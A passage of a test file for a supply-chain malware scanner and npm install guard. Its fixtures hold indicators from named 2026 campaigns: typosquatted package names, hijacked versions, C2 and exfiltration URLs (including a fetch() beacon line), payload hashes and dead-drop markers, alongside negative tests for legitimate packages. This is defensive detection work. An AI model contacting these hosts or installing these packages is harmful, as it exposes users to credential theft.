      const report = await scan({ target: tempDir, format: "text" });
      const dep = report.findings.find((f) => f.rule === "MALICIOUS_DEPENDENCY");
      expect(dep).toBeDefined();
      expect(dep?.match).toBe("viem-js");
      expect(dep?.severity).toBe("critical");
    });

    it("does NOT flag a directory scan depending on the legitimate viem", async () => {
      fs.writeFileSync(
        path.join(tempDir, "package.json"),
        JSON.stringify({
          name: "app",
          version: "1.0.0",
          dependencies: { viem: "2.21.1", tailwindcss: "3.4.4" },
        })
      );
      const report = await scan({ target: tempDir, format: "text" });
      const dep = report.findings.find((f) => f.rule === "MALICIOUS_DEPENDENCY");
      expect(dep).toBeUndefined();
    });

    it("should detect the NeoShadow C2 domain", async () => {
      fs.writeFileSync(
        path.join(tempDir, "c2.js"),
        'const host = "https://metrics-flow.com/collect";'
      );
      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_C2_DOMAIN");
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect the NeoShadow fallback C2 IP", async () => {
      fs.writeFileSync(path.join(tempDir, "ip.js"), 'const c2 = "80.78.22.206";');
      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_C2_IP");
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect the analytics.node backdoor hash", async () => {
      fs.writeFileSync(
        path.join(tempDir, "hashes.js"),
        'const h = "012dfb89ebabcb8918efb0952f4a91515048fd3b87558e90fa45a7ded6656c07";'
      );
      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_MALWARE_HASH");
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("the install guard blocks a NeoShadow package before npm runs", async () => {
      const { analyzeInstallCommand } = await import("../install-guard.js");
      expect(analyzeInstallCommand("npm", ["install", "cyrpto"]).blocked).toBe(true);
      expect(analyzeInstallCommand("npm", ["install", "viem-js@1.0.4"]).blocked).toBe(true);
    });

    it("does NOT flag the legitimate viem at all", async () => {
      const { analyzeInstallCommand } = await import("../install-guard.js");
      const result = analyzeInstallCommand("npm", ["install", "viem"]);
      const rules = result.verdicts.flatMap((v) => v.findings.map((f) => f.rule));
      // NeoShadow's entries must never promote the real package to a malware verdict.
      expect(rules).not.toContain("MALICIOUS_DEPENDENCY");
      expect(rules).not.toContain("THREAT_INTEL_MATCH");
      // viem used to be flagged as a typosquat of "vite": 2 plain Levenshtein edits,
      // under a ceiling that accepted 2. The ceiling is now one transposition-aware
      // edit and viem/vite is still 2, so the finding is gone and installing the real
      // package is no longer blocked. Restore the old <= 2 ceiling and this goes red.
      expect(rules).not.toContain("TYPOSQUAT_LEVENSHTEIN");
      expect(result.blocked).toBe(false);
    });
  });

  // =================================================================
  // SANDWORM_MODE / "Echoes of Shai-Hulud" - token-stealing npm worm
  // that injects malicious MCP servers into AI coding tools
  // (Socket + OX Security, February 2026)
  // =================================================================

  describe("SANDWORM_MODE npm worm (February 2026)", () => {
    const NAMES = [
      "claud-code",
      "cloude-code",
      "cloude",
      "crypto-locale",
      "crypto-reader-info",
      "detect-cache",
      "format-defaults",
      "hardhta",
      "locale-loader-pro",
      "naniod",
      "node-native-bridge",
      "opencraw",
      "parse-compat",
      "rimarf",
      "scan-store",
      "secp256",
      "suport-color",
      "veim",
      "yarsg",
    ];

    it("matches every SANDWORM_MODE package name against the malicious-name patterns", () => {
      for (const name of NAMES) {
        const hit = MALICIOUS_PACKAGE_PATTERNS.some((p) => new RegExp(p).test(name));
        expect(hit, name).toBe(true);
      }
    });

    it("does NOT match the legitimate packages the worm typosquats", () => {
      const legit = [
        "hardhat",
        "rimraf",
        "supports-color",
        "yargs",
        "secp256k1",
        "detect-libc",
        "viem",
      ];
      for (const name of legit) {
        const hit = MALICIOUS_PACKAGE_PATTERNS.some((p) => new RegExp(p).test(name));
        expect(hit, name).toBe(false);
      }
    });

    it("flags a directory scan that depends on a SANDWORM_MODE package (any version)", async () => {
      fs.writeFileSync(
        path.join(tempDir, "package.json"),
        JSON.stringify({
          name: "app",
          version: "1.0.0",
          dependencies: { rimarf: "1.0.0" },
        })
      );
      const report = await scan({ target: tempDir, format: "text" });
      const dep = report.findings.find((f) => f.rule === "MALICIOUS_DEPENDENCY");
      expect(dep).toBeDefined();
      expect(dep?.match).toBe("rimarf");
      expect(dep?.severity).toBe("critical");
    });

    it("does NOT flag a directory scan depending on the legitimate rimraf", async () => {
      fs.writeFileSync(
        path.join(tempDir, "package.json"),
        JSON.stringify({
          name: "app",
          version: "1.0.0",
          dependencies: { rimraf: "5.0.7", "supports-color": "9.4.0" },
        })
      );
      const report = await scan({ target: tempDir, format: "text" });
      const dep = report.findings.find((f) => f.rule === "MALICIOUS_DEPENDENCY");
      expect(dep).toBeUndefined();
    });

    it("should detect the worm C2 subdomain", async () => {
      fs.writeFileSync(
        path.join(tempDir, "beacon.js"),
        'fetch("https://pkg-metrics.official334.workers.dev/ingest");'
      );
      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_C2_DOMAIN");
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should NOT flag an unrelated workers.dev host", async () => {
      // The shared Cloudflare Workers apex must never be blocked wholesale - only
      // the attacker's specific subdomain is an indicator.
      fs.writeFileSync(
        path.join(tempDir, "legit.js"),
        'fetch("https://my-app.example-team.workers.dev/api");'
      );
      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_C2_DOMAIN");
      expect(finding).toBeUndefined();
    });

    it("should detect the stage-2 payload hash", async () => {
      fs.writeFileSync(
        path.join(tempDir, "hashes.js"),
        'const h = "5440e1a424631192dff1162eebc8af5dc2389e3d3b23bd26e9c012279ae116e4";'
      );
      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_MALWARE_HASH");
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("the install guard blocks a SANDWORM_MODE package before npm runs", async () => {
      const { analyzeInstallCommand } = await import("../install-guard.js");
      expect(analyzeInstallCommand("npm", ["install", "suport-color"]).blocked).toBe(true);
      expect(analyzeInstallCommand("npm", ["install", "yarsg@18.0.1"]).blocked).toBe(true);
      expect(analyzeInstallCommand("npm", ["install", "supports-color"]).blocked).toBe(false);
    });
  });
  describe("Alibaba developer toolchain RAT (July 2026)", () => {
    it("should detect the ai-app.pub C2 subdomain", async () => {
      fs.writeFileSync(
        path.join(tempDir, "beacon.js"),
        'fetch("https://xemzqli2vu.ai-app.pub/collect");'
      );
      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_C2_DOMAIN");
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect the Function Compute C2 subdomain", async () => {
      fs.writeFileSync(
        path.join(tempDir, "cfg.js"),
        'const c2 = "diamond-cli-znsxphqell.cn-shanghai.fcapp.run";'
      );
      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_C2_DOMAIN");
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should NOT flag an unrelated Alibaba Function Compute host", async () => {
      // cn-shanghai.fcapp.run is shared Alibaba Function Compute infrastructure.
      // Only the attacker's specific subdomain is an indicator.
      fs.writeFileSync(
        path.join(tempDir, "legit.js"),
        'fetch("https://my-service-abcdefghij.cn-shanghai.fcapp.run/api");'
      );
      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_C2_DOMAIN");
      expect(finding).toBeUndefined();
    });

    it("should NOT flag an unrelated Alibaba Cloud OSS bucket", async () => {
      // oss-cn-beijing.aliyuncs.com is shared object storage used by countless
      // legitimate projects; only the attacker bucket paths are indicators.
      fs.writeFileSync(
        path.join(tempDir, "assets.js"),
        'const url = "https://my-company-assets.oss-cn-beijing.aliyuncs.com/logo.png";'
      );
      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_C2_DOMAIN");
      expect(finding).toBeUndefined();
    });

    it("should detect a staged payload hash", async () => {
      fs.writeFileSync(
        path.join(tempDir, "hashes.js"),
        'const h = "84a6ccaaab1596139d28e822f40cc99c68d337d4c81d1c6d9692c1d6bb22e4af";'
      );
      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_MALWARE_HASH");
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });
  });

  // =================================================================
  // Fake Corepack install site: infostealer + proxyware
  // (Socket / Gurucul / iTnews, July 24, 2026)
  // =================================================================

  describe("Fake Corepack install site (July 2026)", () => {
    it("should detect the impersonation domain in an install step", async () => {
      fs.writeFileSync(
        path.join(tempDir, "setup.js"),
        'const installer = "https://corepack.org/download";'
      );
      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_C2_DOMAIN");
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect a redirect-chain infostealer domain", async () => {
      fs.writeFileSync(
        path.join(tempDir, "chain.js"),
        'location.href = "https://moonlighthathel.org/r";'
      );
      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_C2_DOMAIN");
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect the fake VPN landing page dead drop", async () => {
      fs.writeFileSync(
        path.join(tempDir, "drop.js"),
        'const lp = "https://freevpn.win/lps/gbox-lp/index.html";'
      );
      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_DEAD_DROP");
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should NOT flag legitimate Corepack usage", async () => {
      // Corepack is a real Node.js tool. Only the impersonation domain is an
      // indicator; the tool name and its actual repository must stay clean.
      fs.writeFileSync(
        path.join(tempDir, "legit.js"),
        'const docs = "https://github.com/nodejs/corepack"; run("corepack enable");'
      );
      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_C2_DOMAIN");
      expect(finding).toBeUndefined();
    });

    it("should NOT flag the shared go2cloud.org affiliate-tracking apex", async () => {
      // go2cloud[.]org is the Tune/HasOffers tracking apex used by many legitimate
      // affiliate programs. Only the campaign's specific subdomain is an indicator.
      fs.writeFileSync(
        path.join(tempDir, "tracking.js"),
        'const t = "https://partner.go2cloud.org/aff_c?offer_id=1";'
      );
      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_C2_DOMAIN");
      expect(finding).toBeUndefined();
    });
  });

  describe("Fake Payment SDK typosquats (July 2026)", () => {
    it("should detect a malicious npm index.js hash", async () => {
      fs.writeFileSync(
        path.join(tempDir, "hashes.js"),
        'const h = "ce09810adca70ebec87bc455380ef629ceaa2a0d926149d9115604060167682c";'
      );
      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_MALWARE_HASH");
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect a malicious PyPI __init__.py hash", async () => {
      fs.writeFileSync(
        path.join(tempDir, "hashes.js"),
        'const h = "c6af37a6739f0d919ab7049caf3a85831cab44bdbea27e0d9de7adec80334e2b";'
      );
      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_MALWARE_HASH");
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });
  });

  // =================================================================
  // Joyfill npm compromise / DEV#POPPER (Socket + StepSecurity, July 28, 2026)
  // =================================================================

  describe("Joyfill npm compromise (July 2026)", () => {
    it("should flag @joyfill/components@4.0.0-rc24-2773-beta.5 as a known-bad version", async () => {
      fs.writeFileSync(
        path.join(tempDir, "package.json"),
        JSON.stringify({
          name: "consumer",
          version: "1.0.0",
          dependencies: { "@joyfill/components": "4.0.0-rc24-2773-beta.5" },
        })
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_BAD_VERSION");
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should flag @joyfill/layouts@0.1.2-2773.beta.2 as a known-bad version", async () => {
      fs.writeFileSync(
        path.join(tempDir, "package.json"),
        JSON.stringify({
          name: "consumer",
          version: "1.0.0",
          dependencies: { "@joyfill/layouts": "0.1.2-2773.beta.2" },
        })
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_BAD_VERSION");
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should NOT flag a clean @joyfill/components release", async () => {
      // Both @joyfill packages are legitimate and still maintained. Only the
      // three malicious 2773 beta builds are pinned, so a stable release of the
      // same package must stay clean.
      fs.writeFileSync(
        path.join(tempDir, "package.json"),
        JSON.stringify({
          name: "consumer",
          version: "1.0.0",
          dependencies: { "@joyfill/components": "4.0.0" },
        })
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_BAD_VERSION");
      expect(finding).toBeUndefined();
    });

    it("should detect the Socket.IO RAT payload hash", async () => {
      fs.writeFileSync(
        path.join(tempDir, "hashes.js"),
        'const h = "26351aed0397158d3a3b8cc8fd3047d4c015d264c9895f10f20f1521b974ed18";'
      );
      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_MALWARE_HASH");
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect a stage-3 C2 IP", async () => {
      fs.writeFileSync(
        path.join(tempDir, "c2.js"),
        'const host = "166.88.134.62";'
      );
      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_C2_IP");
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should NOT flag the public blockchain RPC endpoints the loader abuses", async () => {
      // api.trongrid.io / bsc-dataseed.binance.org / fullnode.mainnet.aptoslabs.com
      // are shared public infrastructure used by every legitimate web3 project.
      // Only the attacker-controlled resolver addresses are indicators.
      fs.writeFileSync(
        path.join(tempDir, "web3.js"),
        [
          'const tron = "https://api.trongrid.io";',
          'const bsc = "https://bsc-dataseed.binance.org";',
          'const aptos = "https://fullnode.mainnet.aptoslabs.com";',
        ].join("\n")
      );
      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_C2_DOMAIN");
      expect(finding).toBeUndefined();
    });
  });

  // =================================================================
  // PointBlank PyPI RAT (Xygeni, July 2026)
  // =================================================================

  describe("PointBlank PyPI RAT (July 2026)", () => {
    it("should match gcli-control against the PyPI typosquat patterns", () => {
      const hit = PYPI_TYPOSQUAT_PATTERNS.some((p) => new RegExp(p).test("gcli-control"));
      expect(hit).toBe(true);
    });

    it("does NOT match the generic 'gcli' import name or neighbouring names", () => {
      // gcli-control installs an import package called "gcli", which is far too
      // short and generic to pin without colliding with legitimate projects.
      // The block is anchored, so adjacent names must stay clean too.
      for (const name of ["gcli", "gcli-controller", "my-gcli-control"]) {
        const hit = PYPI_TYPOSQUAT_PATTERNS.some((p) => new RegExp(p).test(name));
        expect(hit, name).toBe(false);
      }
    });

    // The two assertions above pass against the pattern CONSTANT and say nothing
    // about which ecosystem the feed entry lands in. The first draft of this entry
    // was a bare "gcli-control", which is the npm namespace: a Python project got
    // ZERO findings while an npm dependency of the same name was flagged critical.
    // These two go through scan(), which is what actually catches that inversion.
    it("flags gcli-control through a real scan of a Python lockfile", async () => {
      fs.writeFileSync(
        path.join(tempDir, "poetry.lock"),
        '[[package]]\nname = "gcli-control"\nversion = "0.13.0"\ndescription = "rat"\n',
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => /gcli-control/.test(JSON.stringify(f)));
      expect(finding, "PyPI lockfile must flag the PointBlank RAT").toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("does NOT flag an npm dependency named gcli-control (wrong ecosystem)", async () => {
      fs.writeFileSync(
        path.join(tempDir, "package.json"),
        JSON.stringify({ name: "t", version: "1.0.0", dependencies: { "gcli-control": "0.13.0" } }),
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => /gcli-control/.test(JSON.stringify(f)));
      expect(finding, "a PyPI IOC must not fire on an npm dependency").toBeUndefined();
    });
  });

  // =================================================================
  // mrmustard PyPI compromise (July 2026)
  // =================================================================

  describe("mrmustard PyPI compromise (July 2026)", () => {
    // mrmustard is a REAL XanaduAI library with a long clean history, so this is a
    // version pin, not a name block. The negative test below is the one that matters:
    // blocking the name would fire on every clean install of a legitimate project.
    it("flags the poisoned 0.7.4 through a real scan of a Python lockfile", async () => {
      fs.writeFileSync(
        path.join(tempDir, "poetry.lock"),
        '[[package]]\nname = "mrmustard"\nversion = "0.7.4"\ndescription = "quantum"\n',
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => /mrmustard/.test(JSON.stringify(f)));
      expect(finding, "PyPI lockfile must flag the poisoned mrmustard release").toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("does NOT flag the clean 0.7.3 release", async () => {
      fs.writeFileSync(
        path.join(tempDir, "poetry.lock"),
        '[[package]]\nname = "mrmustard"\nversion = "0.7.3"\ndescription = "quantum"\n',
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => /mrmustard/.test(JSON.stringify(f)));
      expect(finding, "only 0.7.4 is malicious - 0.7.3 must stay clean").toBeUndefined();
    });

    it("flags the credential exfiltration C2 domain", async () => {
      fs.writeFileSync(
        path.join(tempDir, "probe.js"),
        'const endpoint = "https://metrics.femboy.energy/v1/collect";\n',
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_C2_DOMAIN");
      expect(finding, "the mrmustard exfil host must be flagged").toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("flags the poisoned 0.7.4 artifact hash", async () => {
      fs.writeFileSync(
        path.join(tempDir, "lock.js"),
        'const sha = "0404f8590fdaef95280c1d908068f31bf2321fe887faabf0c2329ba67c7203cb";\n',
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_MALWARE_HASH");
      expect(finding, "the poisoned sdist hash must be flagged").toBeDefined();
    });

    // webhook.site is an ordinary development tool. Only the attacker's bin id is an
    // indicator, so an unrelated bin must not trip the scanner.
    it("does NOT flag an unrelated webhook.site bin", async () => {
      fs.writeFileSync(
        path.join(tempDir, "debug.js"),
        'const hook = "https://webhook.site/00000000-1111-2222-3333-444444444444";\n',
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => /webhook\.site/.test(JSON.stringify(f)));
      expect(finding, "the webhook.site apex must not be blocked").toBeUndefined();
    });
  });

  // =================================================================
  // ChainDrop npm worm / "Mini Shai-Hulud" (August 2026)
  // =================================================================

  describe("ChainDrop npm worm (August 2026)", () => {
    // Every package in this campaign is a legitimate, heavily-depended-on project whose
    // publisher account was taken over, so these are version pins rather than name blocks.
    // keyv alone carries 127M+ weekly downloads, which makes the negative tests below the
    // load-bearing ones: a name block here would fire on a large share of the ecosystem.
    it("flags the hijacked keyv@6.0.0 through a real scan", async () => {
      fs.writeFileSync(
        path.join(tempDir, "package.json"),
        JSON.stringify({
          name: "consumer",
          version: "1.0.0",
          dependencies: { keyv: "6.0.0" },
        }),
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_BAD_VERSION");
      expect(finding, "the hijacked keyv release must be flagged").toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("does NOT flag the clean keyv@5.6.0 release", async () => {
      fs.writeFileSync(
        path.join(tempDir, "package.json"),
        JSON.stringify({
          name: "consumer",
          version: "1.0.0",
          dependencies: { keyv: "5.6.0" },
        }),
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => /keyv/.test(JSON.stringify(f)));
      expect(
        finding,
        "only 6.0.0 is malicious - 5.6.0 is still the latest tag and must stay clean",
      ).toBeUndefined();
    });

    it("flags the hijacked flat-cache@6.1.24 through a real scan", async () => {
      fs.writeFileSync(
        path.join(tempDir, "package.json"),
        JSON.stringify({
          name: "consumer",
          version: "1.0.0",
          dependencies: { "flat-cache": "6.1.24" },
        }),
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_BAD_VERSION");
      expect(finding, "the hijacked flat-cache release must be flagged").toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("does NOT flag the clean flat-cache@6.1.5 release", async () => {
      fs.writeFileSync(
        path.join(tempDir, "package.json"),
        JSON.stringify({
          name: "consumer",
          version: "1.0.0",
          dependencies: { "flat-cache": "6.1.5" },
        }),
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => /flat-cache/.test(JSON.stringify(f)));
      expect(finding, "only 6.1.24 is malicious - 6.1.5 must stay clean").toBeUndefined();
    });

    it("flags the credential exfiltration C2 domain", async () => {
      fs.writeFileSync(
        path.join(tempDir, "setup.mjs"),
        'const c2 = "https://npm-cache.com:443/router";\n',
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_C2_DOMAIN");
      expect(finding, "the ChainDrop exfil host must be flagged").toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("flags the stage-2 credential stealer hash", async () => {
      fs.writeFileSync(
        path.join(tempDir, "manifest.js"),
        'const sha = "9fc2570b7cef51c1b8df116d144d11ff4096357be7d2c4c6367cfc2509cf1bcc";\n',
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_MALWARE_HASH");
      expect(finding, "the stage-2 payload hash must be flagged").toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("flags the Ethereum dead-drop C2 resolver contract", async () => {
      fs.writeFileSync(
        path.join(tempDir, "resolver.js"),
        'const contract = "0xE1f2395ee43e45A1556EC6438a88c31B83493103";\n',
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_C2_WALLET");
      expect(finding, "the on-chain dead-drop contract must be flagged").toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    // The stage-2 payload queries the cloud metadata service, but those addresses are
    // legitimate link-local endpoints that appear in ordinary infrastructure code. They
    // are targets of the malware, not indicators of it, and must never be ingested.
    it("does NOT flag the cloud metadata addresses the payload queries", async () => {
      fs.writeFileSync(
        path.join(tempDir, "imds.js"),
        'const imds = "http://169.254.169.254/latest/meta-data/";\n' +
          'const ecs = "http://169.254.170.2/v2/credentials";\n',
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => /169\.254\./.test(JSON.stringify(f)));
      expect(
        finding,
        "cloud metadata endpoints are legitimate infrastructure and must not be blocked",
      ).toBeUndefined();
    });

    it("flags the sibling C2 routers resolved from the same contract", async () => {
      fs.writeFileSync(
        path.join(tempDir, "router.js"),
        'const a = "https://pypi-get.com:443/router";\n' +
          'const b = "https://js-mirror.com:443/router";\n' +
          'const c = "https://awqhnjewqjkl.icu:443/router";\n',
      );

      const report = await scan({ target: tempDir, format: "text" });
      const hosts = report.findings
        .filter((f) => f.rule === "IOC_KNOWN_C2_DOMAIN")
        .map((f) => f.description)
        .join(" ");
      expect(hosts, "pypi-get must be flagged").toContain("pypi-get.com");
      expect(hosts, "js-mirror must be flagged").toContain("js-mirror.com");
      expect(hosts, "the .icu rotation target must be flagged").toContain("awqhnjewqjkl.icu");
    });

    // The resolver reads the C2 address from a mainnet contract through public
    // Ethereum RPC providers. Those are shared, legitimate services used by
    // ordinary web3 projects: blocking them would flag every Ethereum repository.
    it("does NOT flag the public Ethereum RPC providers the resolver calls", async () => {
      fs.writeFileSync(
        path.join(tempDir, "rpc.js"),
        'const rpcs = ["https://eth-mainnet.nodereal.io/v1/x",' +
          '"https://go.getblock.io/x","https://eth.llamarpc.com"];\n',
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) =>
        /nodereal|getblock|llamarpc/.test(JSON.stringify(f)),
      );
      expect(
        finding,
        "public Ethereum RPC endpoints are legitimate infrastructure and must not be blocked",
      ).toBeUndefined();
    });

    it("flags the re-obfuscated wave payload hashes", async () => {
      fs.writeFileSync(
        // Not a .txt: BENIGN_DOC_FILES exempts documentation from the IOC
        // blocklist, because write-ups legitimately quote hashes.
        path.join(tempDir, "waves.js"),
        'const known = [\n  "927387d0cfac1118df4b383decc2ea6ba49c9d2f98b47098bcbcba1efc026e1f",\n' +
          '  "14eb4ce01dd4307759887ff819359b70d7d9ff709ecde039a5abc1aac325b128",\n' +
          '  "3f3f42d072bd36860ab7bd7fb5e10ac0d22c741c13c89505ccd6ec0ea572eea7",\n' +
          '  "29ac906c8bd801dfe1cb39596197df49f80fff2270b3e7fbab52278c24e4f1a7",\n];\n',
      );

      const report = await scan({ target: tempDir, format: "text" });
      const hashes = report.findings.filter((f) => f.rule === "IOC_KNOWN_MALWARE_HASH");
      expect(hashes.length, "all four later-wave hashes must be flagged").toBe(4);
    });

    it("flags the third preinstall-dropper variant", async () => {
      fs.writeFileSync(
        path.join(tempDir, "dropper.js"),
        'const q = "b27b82afa5f15512f3856e549fb83d873fd0049759a4b62ce64c8d7d4dc2c678";\n',
      );

      const report = await scan({ target: tempDir, format: "text" });
      const hashes = report.findings.filter((f) => f.rule === "IOC_KNOWN_MALWARE_HASH");
      expect(hashes.length, "the setup.mjs.malicious variant must be flagged").toBe(1);
    });

    it("flags the GitHub exfiltration dead-drop markers", async () => {
      fs.writeFileSync(
        path.join(tempDir, "exfil.js"),
        'const repo = "thebeautifulmarchoftime";\n' +
          'const alt = "thebeautifulsnadsoftime";\n',
      );

      const report = await scan({ target: tempDir, format: "text" });
      const drops = report.findings
        .filter((f) => f.rule === "IOC_KNOWN_DEAD_DROP")
        .map((f) => f.description)
        .join(" ");
      expect(drops).toContain("thebeautifulmarchoftime");
      expect(drops).toContain("thebeautifulsnadsoftime");
    });
  });

  // =================================================================
  // Alibaba developer toolchain RAT - Corgea follow-up (August 2026)
  // =================================================================

  describe("Alibaba Dev Toolchain RAT (Corgea follow-up)", () => {
    it("flags the live raw config dead-drop path", async () => {
      fs.writeFileSync(
        path.join(tempDir, "loader.js"),
        'const cfg = "https://raw.githubusercontent.com/smi1e2u/smart-config-manager/main/defaults/preferences.json";\n',
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_DEAD_DROP");
      expect(finding, "the config dead-drop path must be flagged").toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    // raw.githubusercontent.com serves every public repository on GitHub. Only the
    // full attacker path is an indicator; the host on its own never is.
    it("does NOT flag an unrelated raw.githubusercontent.com URL", async () => {
      fs.writeFileSync(
        path.join(tempDir, "fetch.js"),
        'const readme = "https://raw.githubusercontent.com/nodejs/node/main/README.md";\n',
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_DEAD_DROP");
      expect(
        finding,
        "the raw.githubusercontent.com host is shared infrastructure and must not be blocked",
      ).toBeUndefined();
    });

    it("flags the node-data-utils staging package at 1.0.1", async () => {
      fs.writeFileSync(
        path.join(tempDir, "package.json"),
        JSON.stringify({
          name: "consumer",
          version: "1.0.0",
          dependencies: { "node-data-utils": "1.0.1" },
        }),
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_BAD_VERSION");
      expect(finding, "the staging package version must be flagged").toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("does NOT flag a different node-data-utils version", async () => {
      fs.writeFileSync(
        path.join(tempDir, "package.json"),
        JSON.stringify({
          name: "consumer",
          version: "1.0.0",
          dependencies: { "node-data-utils": "2.0.0" },
        }),
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => /node-data-utils/.test(JSON.stringify(f)));
      expect(finding, "only 1.0.1 is pinned - other versions must stay clean").toBeUndefined();
    });
  });

  // =================================================================
  // GlassWASM - trojanized Open VSX extensions (June 2026)
  // =================================================================

  describe("GlassWASM (trojanized Open VSX extensions)", () => {
    it("flags the stage-2 delivery host", async () => {
      fs.writeFileSync(
        path.join(tempDir, "stager.js"),
        'const host = "https://dodod.lat/linux/i/_";\n',
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_C2_DOMAIN");
      expect(finding, "the GlassWASM delivery host must be flagged").toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("flags the TinyGo WebAssembly stager hash", async () => {
      fs.writeFileSync(
        path.join(tempDir, "manifest.js"),
        'const sha = "558b4f1d9a263c13756ab0126c09dd080c85ba405b29488e1c4e6aa68b554f1f";\n',
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_MALWARE_HASH");
      expect(finding, "the WASM stager hash must be flagged").toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

